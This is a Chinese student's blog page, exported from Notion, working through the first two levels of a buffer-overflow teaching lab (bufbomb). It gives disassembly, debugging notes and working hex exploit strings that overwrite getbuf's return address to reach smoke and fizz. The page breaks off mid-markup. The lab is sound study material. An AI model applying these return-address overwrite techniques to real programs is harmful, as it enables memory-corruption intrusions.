<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F10daba46-51b9-474a-9c22-1222e6e158b2%2FPMI74K6FO73MCR770JT.png?table=collection&amp;id=51a399fe-3ada-47de-a312-8e2ad5e56579">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>实验四buffer&nbsp;|&nbsp;这儿是什么地方</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="实验四buffer">
  
  
    <meta property="og:image" content="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🧨&lt;/text&gt;&lt;/svg&gt;">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="index.html">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F10daba46-51b9-474a-9c22-1222e6e158b2%2FPMI74K6FO73MCR770JT.png?table=collection&amp;id=51a399fe-3ada-47de-a312-8e2ad5e56579"></span>&nbsp;
      
      <span>SixGoogle</span>
    </div>
  </a>
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="about-me-1b4752.html">
        <div class="Navbar__Btn">
          
            <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;😀&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
          
          <span>About me?</span>
        </div>
      </a>
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🧨&lt;/text&gt;&lt;/svg&gt;"></span>
      </div>
    
    <h1 class="Header__Title">实验四buffer</h1>
    
  </header>
  <article id="https://www.notion.so/673cb7b0027f4651bfc2ed1cd9c463d3" class="PageRoot"><div id="https://www.notion.so/679ec61a7b7443378d93ae792a084084" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fdd0715a2-6d01-478b-9d2f-ee20e3b5b919%2FUntitled.png?width=783&amp;table=block&amp;id=679ec61a-7b74-4337-8d93-ae792a084084"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fdd0715a2-6d01-478b-9d2f-ee20e3b5b919%2FUntitled.png?width=783&amp;table=block&amp;id=679ec61a-7b74-4337-8d93-ae792a084084" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b9147bfb4d944dfc994c4be359eb626e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">用学号生成一个cookie先，</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x206b4e28</code></span></span></p></div><h1 id="https://www.notion.so/91877842718e4b8798cabe42a0dc4357" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/91877842718e4b8798cabe42a0dc4357"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">做什么</span></span></h1><div id="https://www.notion.so/33a3663d32464a2083cf8f3964394f37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.csdn.net/longzaizai_/article/details/124559539">实验三-Bufflab（缓冲区溢出攻击、buffbomb/buffbomb）实验总结_缓冲区溢出攻击实验总结-CSDN博客</a></span></span></p></div><h2 id="https://www.notion.so/1ed1435d8a7e4ccd8b78b01b6f35c294" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1ed1435d8a7e4ccd8b78b01b6f35c294"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">实现原理</span></span></h2><div id="https://www.notion.so/310352ff03b043bc87e34ce991d75383" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">BUFBOMB program读取输入用下面的函数</span></span></p></div><pre id="https://www.notion.so/720fbdc10fe74ae8971071d9a82e4972" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token number">1</span> <span class="token comment">/* Buffer size for getbuf */</span>
<span class="token number">2</span> #define NORMAL_BUFFER_SIZE <span class="token number">32</span>
<span class="token number">3</span>
<span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token number">5</span> <span class="token punctuation">{</span>
<span class="token number">6</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span>NORMAL_BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token number">7</span> <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">8</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token number">9</span> <span class="token punctuation">}</span>  </span></span></span></code></pre><div id="https://www.notion.so/3779ed65844643d2b0b501a491a5089a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Gets读取输入，以/n回车结束，读取的数据存入buf，可能会溢出</span></span></p></div><div id="https://www.notion.so/c946cbf97e79483f96fda6e11d8c1acd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">输入恶意的长字符。突破Gets的栈帧，控制覆盖getbuf的栈帧，完成攻击
</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">HEX2RAW ：</strong></span><span class="SemanticString">，它能将十六进制格式的字符串转换为原始二进制格式。在输入给HEX2RAW的数据中，每个字节值由两个十六进制数字表示，字节之间用空白（空格或换行符）分隔，允许使用注释格式为</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">/* 注释内容 */</strong></code></span></span></p></div><div id="https://www.notion.so/8cab79e91de24360865db922546cea50" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">注意 </strong></span></span></p></div><div id="https://www.notion.so/7b1b259d588a4296a2ec4feb3056da85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">字符串中间</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">不包含0x0A（换行符）</mark></span><span class="SemanticString"> ； 确保每个十六进制值都是</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">两位数，且之间有空白分隔</mark></span><span class="SemanticString">。</span></span></p></div><div id="https://www.notion.so/7473d4ba258546958935b2bd3e340ffe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">测试命令</strong></span></span></p></div><div id="https://www.notion.so/ca18c19b6e4a42cd9c2f714f1620b973" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat leverx.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/d4e37e38f36d469592598aad93343c6e" class="ColumnList"><div id="https://www.notion.so/bcf40c25a6854edd8c788859a04eb0ac" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.0625)"><div id="https://www.notion.so/4815fe9beb3a4233960574abacf99c3b" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc7e23ac0-be84-4c90-9ecd-404014368759%2FUntitled.png?width=87&amp;table=block&amp;id=4815fe9b-eb3a-4233-9605-74abacf99c3b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc7e23ac0-be84-4c90-9ecd-404014368759%2FUntitled.png?width=87&amp;table=block&amp;id=4815fe9b-eb3a-4233-9605-74abacf99c3b" style="width:87px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div><div id="https://www.notion.so/eb2f4aa910394efdbfac80d6406982c9" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.9375000000000002)"><div id="https://www.notion.so/476c17b5b58a433fb5e104f663b8ce61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">输入着玩</span></span></p></div></div></div><div id="https://www.notion.so/25f95c79fe9e45a796cfe06343154f39" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F8fdb53da-c5cc-4a86-b9c7-ec12ca74cfde%2FUntitled.png?width=707.9923706054688&amp;table=block&amp;id=25f95c79-fe9e-45a7-96cf-e06343154f39"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F8fdb53da-c5cc-4a86-b9c7-ec12ca74cfde%2FUntitled.png?width=707.9923706054688&amp;table=block&amp;id=25f95c79-fe9e-45a7-96cf-e06343154f39" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e0eb3e59e84544d3a91de379d081900c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">得分析汇编，还是在32位虚拟机objdump出来，在vs看，wsl调试</span></span></p></div><h1 id="https://www.notion.so/bd0dbaa9611340f291e25426b594fb90" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/bd0dbaa9611340f291e25426b594fb90"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever0- Candle 蜡烛</span></span></h1><div id="https://www.notion.so/a5af76f762da42039ada50058292beb1" class="ColumnList"><div id="https://www.notion.so/38c20fa96ac0438a81ad593ed33cee91" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/c08a1f8bf8324adea2cd4e66574e328e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">让BUFBOMB在getbuf执行其返回语句时执行smoke的代码，而不是返回到test。请注意，您的漏洞利用字符串也可能破坏与此阶段不直接相关的堆栈部分，但这不会导致问题，因为smoke会导致程序直接退出。</span></span></p></div></div><div id="https://www.notion.so/b7900200332741159c98acddd257e527" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/4b54b5d00a244e3e984679bd863f340e" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F1049393a-5310-4f62-bff9-288b0305340b%2FUntitled.png?width=369&amp;table=block&amp;id=4b54b5d0-0a24-4e3e-9846-79bd863f340e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F1049393a-5310-4f62-bff9-288b0305340b%2FUntitled.png?width=369&amp;table=block&amp;id=4b54b5d0-0a24-4e3e-9846-79bd863f340e" style="width:369px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><pre id="https://www.notion.so/e3d2435b2b984c228f1a7abfd50db939" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08049262 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getbuf</span><span class="token punctuation">></span></span>:
 8049262:	55                   	push   %ebp
 8049263:	89 e5                	mov    %esp,%ebp
 8049265:	83 ec 38             	sub    $0x38,%esp
 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax
 #说明缓冲区大小是0x28 40字节
 804926b:	89 04 24             	mov    %eax,(%esp)
 804926e:	e8 bf f9 ff ff       	call   8048c32 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Gets</span><span class="token punctuation">></span></span>
 8049273:	b8 01 00 00 00       	mov    $0x1,%eax
 #返回eax是1
 8049278:	c9                   	leave  
 8049279:	c3                   	ret    
 804927a:	90                   	nop
 804927b:	90                   	nop
 804927c:	90                   	nop
 804927d:	90                   	nop
 804927e:	90                   	nop
 804927f:	90                   	nop</span></span></span></code></pre><div id="https://www.notion.so/c39305a915214918afa7c3931b109204" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">要去smoke的地址是08048e0a,但是字符串中间不应出现0a,考虑从0b进入，跳过push %ebp</span></span></p></div><div id="https://www.notion.so/63892e60c25a4068968c6ef4abe73156" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">那么就修改返回地址，用40个字符填满缓冲区后，再用4个字符覆盖old ebp 然后四个字符覆盖返回地址，用小端法是 0b 8e 04 08</span></span></p></div><div id="https://www.notion.so/f2878bfeb97641dbb7d78b295e4cdba9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">得
</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 0b 8e 04 08</strong></mark></span></span></p></div><div id="https://www.notion.so/7abad2bf59714d13aaa7ce8e5e1ee680" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever0.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/41b49387aff341c88fdc9f67665bb880" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F38493e75-d9aa-4252-b37a-79f47181f55b%2FUntitled.png?width=1589&amp;table=block&amp;id=41b49387-aff3-41c8-8fdc-9f67665bb880"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F38493e75-d9aa-4252-b37a-79f47181f55b%2FUntitled.png?width=1589&amp;table=block&amp;id=41b49387-aff3-41c8-8fdc-9f67665bb880" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h1 id="https://www.notion.so/7c90f54d28a246d098cb6160cda520d5" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/7c90f54d28a246d098cb6160cda520d5"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever1-Sparkler 火花</span></span></h1><div id="https://www.notion.so/cfad57eaf708455eb8639e50c2fce260" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Faf5c2e2b-fa32-4373-8468-ec242ec9c5d4%2FUntitled.png?width=558&amp;table=block&amp;id=cfad57ea-f708-455e-b863-9e50c2fce260"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Faf5c2e2b-fa32-4373-8468-ec242ec9c5d4%2FUntitled.png?width=558&amp;table=block&amp;id=cfad57ea-f708-455e-b863-9e50c2fce260" style="width:558px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4085e96fd0f144629586bcf43efe4b4e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">调用fizz，但这次需要修改val为我的cookie</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x206b4e28</code></span></span></p></div><pre id="https://www.notion.so/b94650506c954eec993adc198b39079f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048daf <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fizz</span><span class="token punctuation">></span></span>:
 8048daf:	55                   	push   %ebp
 8048db0:	89 e5                	mov    %esp,%ebp
 8048db2:	83 ec 18             	sub    $0x18,%esp
 8048db5:	8b 45 08             	mov    0x8(%ebp),%eax
 8048db8:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax
 # 0x8(%ebp)放的就是val，需要修改他为我的cookie
 8048dbe:	75 26                	jne    8048de6 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fizz+0x37</span><span class="token punctuation">></span></span>
 ……</span></span></span></code></pre><div id="https://www.notion.so/7774308e375549cb905a0d66043a95d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">如果是通过缓冲区溢出修改返回地址到达fizz，那么只需要0x8(%ebp)是cookie即可</span></span></p></div><div id="https://www.notion.so/44e320ee0c9544ea8a9d22b055f4e6c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">即</span></span></p></div><div id="https://www.notion.so/170c970d2a6040d4b4442923c3873d20" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"> 00</mark></span><span class="SemanticString"> af 8d 04 08
28 4e 6b 20</span></span></p></div><div id="https://www.notion.so/448a81e1ac1a4eb8b1889283b78351bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever1.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span><span class="SemanticString"> 段错误？</span></span></p></div><div id="https://www.notion.so/fd0172d0301e4f79b6d9bca4c45c36fe" class="ColumnList"><div id="https://www.notion.so/f658919c17fd4b8ea41fab1ef2f6c104" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.875)"><div id="https://www.notion.so/ec346908eeb14fb881a0b9a39744057f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F33c811fc-b585-499c-8b91-610b3d978ba6%2FUntitled.png?width=947&amp;table=block&amp;id=ec346908-eeb1-4fb8-81a0-b9a39744057f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F33c811fc-b585-499c-8b91-610b3d978ba6%2FUntitled.png?width=947&amp;table=block&amp;id=ec346908-eeb1-4fb8-81a0-b9a39744057f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div><div id="https://www.notion.so/e349b810e7074844be3c8ffb95e32abd" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.12500000000000006)"><div id="https://www.notion.so/68bfd4af6e1a4e8d8f3a2e10b06f54d7" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc16fa627-5a53-4022-bb06-bd98b54def19%2FUntitled.jpeg?width=160&amp;table=block&amp;id=68bfd4af-6e1a-4e8d-8f3a-2e10b06f54d7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fc16fa627-5a53-4022-bb06-bd98b54def19%2FUntitled.jpeg?width=160&amp;table=block&amp;id=68bfd4af-6e1a-4e8d-8f3a-2e10b06f54d7" style="width:160px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><div id="https://www.notion.so/5114b29a7e7b482e9b2c9500164a5cb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">！当getbuf返回后old ebp不应该被修改</del></span></span></p></div><div id="https://www.notion.so/93e725e9ebd44b8e8a3b4ee04ca70a5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">(gdb) run -u 202208060120 &lt; lever1.txt</code></span></span></p></div><div id="https://www.notion.so/be9c63d399c740f5b0adad8261cfadbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在getbufleave前打断点发现</span></span></p></div><div id="https://www.notion.so/1c4fab5d23964477ae840440df7630b5" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F13d156c6-b65f-44c6-bbf7-70e53b6ea4f9%2FUntitled.png?width=602&amp;table=block&amp;id=1c4fab5d-2396-4477-ae84-0440df7630b5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F13d156c6-b65f-44c6-bbf7-70e53b6ea4f9%2FUntitled.png?width=602&amp;table=block&amp;id=1c4fab5d-2396-4477-ae84-0440df7630b5" style="width:602px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0831e272039a4cb1850081ada0fceb57" class="ColumnList"><div id="https://www.notion.so/36096fe39add4bbaa56035bd0914562f" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/35aad12451694392b56bc95230b9e2e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">执行leave后</span></span></p></div><div id="https://www.notion.so/3c62e56d410048dd8bdc6b24b60100a0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">oldebp是右边这个 未成功修改old ebp</span></span></p></div></div><div id="https://www.notion.so/073f59c2133943bdae5af312dc11a0de" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/9bbdf00c7ef747ea92edff7b166bb906" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F03a60738-fd9d-4e92-b1df-2b8f22ac488c%2FUntitled.png?width=273&amp;table=block&amp;id=9bbdf00c-7ef7-47ea-92ed-ff7b166bb906"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F03a60738-fd9d-4e92-b1df-2b8f22ac488c%2FUntitled.png?width=273&amp;table=block&amp;id=9bbdf00c-7ef7-47ea-92ed-ff7b166bb906" style="width:273px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><div id="https://www.notion.so/80541bd798df43d0a1936716e8e278b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">不管了，在fizz打断点看ebp到底在哪先</span></span></p></div><div id="https://www.notion.so/c12a54f00bf847abb5e4ca5bde6e4238" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">为什么一直段错误 在32位机器也是段错误</span></span></p></div><div id="https://www.notion.so/3a4c0303c2a84794a34ba6a2cd0322c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">上面第五行之前多了一个00 。。。。。。。。。。。</span></span></p></div><div 